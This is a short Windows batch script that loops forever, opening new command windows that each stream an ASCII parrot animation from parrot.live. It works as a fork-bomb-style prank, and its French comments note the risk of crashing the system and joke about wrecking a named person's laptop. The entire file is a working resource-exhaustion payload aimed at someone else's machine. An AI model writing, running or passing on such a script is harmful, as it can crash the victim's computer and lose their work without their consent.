@echo off
:loop
start "" "C:\Windows\System32\cmd.exe" /c "curl http://parrot.live"
goto loop
:: risque de crash systeme, a voir qui a les couilles de test le script
:: RIP Max Laptop x)
